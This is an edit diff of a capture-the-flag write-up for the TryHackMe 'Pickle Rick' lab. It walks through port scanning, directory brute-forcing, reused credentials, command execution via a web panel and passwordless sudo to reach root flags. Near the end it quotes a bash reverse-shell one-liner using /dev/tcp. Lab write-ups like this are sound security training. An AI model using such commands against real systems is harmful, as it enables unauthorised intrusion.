@@ -1,10 +1,10 @@
-# Try Hack Me - Pickle Rick Room
+# Try Hack Me - [Pickle Rick Room](https://tryhackme.com/room/picklerick)
 
 ## Easy rated, CTF style lab, based on the television show Rick and Morty.
 
 In this Rick and Morty themed lab, users are challenged to exploit a web server to find 3 ingredients that will help Rick make a potion that will transform him from pickle to human.
 
-First after starting the machine I run Nmap to see what ports are open and saving the results to a file called initial_scan.
+First, after starting the machine, I run Nmap to see what ports are open and save the results to a file called initial_scan.
 
 ![nmap1](https://user-images.githubusercontent.com/90977933/133953217-d124f8bc-3925-4df8-beb7-5b187ef3f915.png)
 
@@ -17,7 +17,7 @@ With only two open ports, 22 and 80, I use the -A flag in Nmap on those two port
 ![nmap3](https://user-images.githubusercontent.com/90977933/133953528-52df3b14-3adf-4503-bec3-2815fafd5255.png)
 
 
-From our results I can the victim machine is running Linux Ubuntu and that there is an Apache web server and webpage on port 80
+From our results I can see the victim machine is running Linux Ubuntu and that there is an Apache web server and webpage on port 80.
 
 
 ### visiting the webpage!
@@ -26,9 +26,9 @@ From our results I can the victim machine is running Linux Ubuntu and that there
 ![browser1](https://user-images.githubusercontent.com/90977933/133953712-b398f2b4-c2bc-4bec-be40-27850a845135.png)
 
 
-Here begins the start of the story. The webpage is a note from Rick to Morty explaining that he has turned himself into a pickle again and needs Morty's help to turn back. He tells Morty to log into his computer and find the last three secret ingredients needed for his "pickle-reverse potion", but he has no idea what the password is. 
+**Here begins the start of the story.** The webpage is a note from Rick to Morty explaining that he has turned himself into a pickle again and needs Morty's help to turn back. He tells Morty to log into his computer and find the last three secret ingredients needed for his "pickle-reverse potion", but he has no idea what the password is. 
 
-My first thought it to look at the source code of the webpage to see if there is anything useful.
+My first thought is to look at the source code of the webpage to see if there is anything useful.
 
 ![browser1_sc](https://user-images.githubusercontent.com/90977933/133953942-66b0f19e-6132-4a2c-9b56-7ec3b1c873e7.png)
 
@@ -60,7 +60,7 @@ In the gobuster results there are two 302 redirects to a /login.php directory.
 ![gobuster2](https://user-images.githubusercontent.com/90977933/133954263-852e4387-2812-4112-a9e2-487b4e183982.png)
 
 
-I visit the login.php and find a login portal and try the same username and password combo I used earlier for SSH.
+I visit the login.php to find a login portal and try the same username and password combination I used earlier for SSH.
 
 ### Success!
 
@@ -74,7 +74,7 @@ Since I know the machine we are connected to is a linux machine, I enter the *wh
 ![command1](https://user-images.githubusercontent.com/90977933/133954466-ce87b84b-5933-48de-93f4-5d34c471a9c1.png)
 
 
-Printed to our screen I see the output www-data.
+Printed to our screen I see the output www-data and with that i think it's safe to say we are interacting directly with the server through this page.
 
 ![command2](https://user-images.githubusercontent.com/90977933/133954474-8bf1c555-3c95-4eb2-bc1f-aa588688d449.png)
 
@@ -85,14 +85,14 @@ Trying to use the *cat* command showed that it is disabled along with more.
 ![disabled](https://user-images.githubusercontent.com/90977933/133954528-740b4f27-ecc7-43c3-9282-be5eed242025.png)
 
 
-Looking into the disabled page source code I find a comment that looks like base encoding.
+Looking into the disabled page source code I find a comment that looks like base64 encoding.
 
 ![disabled2](https://user-images.githubusercontent.com/90977933/133954648-214b9bf8-7746-4ae5-84e4-16720e694a4f.png)
 
 After decoding a few times I realized the string was getting smaller and smaller which led me to believe it may have been a password.
-It was not... rabbit hole
+It was not... rabbit hole...
 
-Getting back on track! I go back to the command page and some directory traversal to see what other information I can find. Using *ls -la ../../../home* I find users rick and ubuntu. I later found that typing ../../ was unnecessary 
+Getting back on track! I go back to the command page and try some directory traversal to see what other information I can find. Using *ls -la ../../../home* I find users rick and ubuntu. I later found that it was unnecessary to use ../ since we we are interacting directly with the server and there were no checks outside of dissalowed commands and regular file permissions. 
 
 
 
@@ -116,7 +116,7 @@ Since *cat* is disabled I tried the *more* command with no luck. Next option is 
 
 I assume now the 3rd and final flag is in the machines root folder. Typically I would try to get a shell on the machine but since we can execute commands here, lets see what we can do here first.
 
-Since I am logged in as the www-data user. I check to see what permissions they have using *sudo -l*
+Since it is the www-data user interacting with the server. I check to see what permissions www-data has using *sudo -l* command.
 
 
 
@@ -124,7 +124,7 @@ Since I am logged in as the www-data user. I check to see what permissions they 
 
 
 
-Luckily for us user www-data can run ALL COMMANDS WITH NO PASSWORD So now I *sudo -ls -la* the contents of the **/root** folder
+Luckily for us user www-data can run **ALL COMMANDS WITH NO PASSWORD!!!** So now I *sudo -ls -la* the contents of the **/root** folder
 
 
 
@@ -139,11 +139,11 @@ And like before, I used the *less* command to view the contents of file **3rd.tx
 ![root3](https://user-images.githubusercontent.com/90977933/133955061-677b23f5-a661-44ee-8115-c8a7e1d33eb8.png)
 
 
-This lab was a quick and easy room that didn't require you to gain access to solve. 
-I did go back and try tp gain access using a reverse shell and had success with
+This lab was a quick and easy room that didn't require you to gain access to retrieve the final flag. 
+I did go back and try to gain access using a reverse shell and had success with executing 
 
 **Bash -c \'bash -I >& /dev/tcp/IP address/8080 0>&1\'**
 
-From there it was the same sudo -l commands to find the final flag.
+in the command webpage. From there it was the same sudo commands to find the final flag.
 
 -Simon
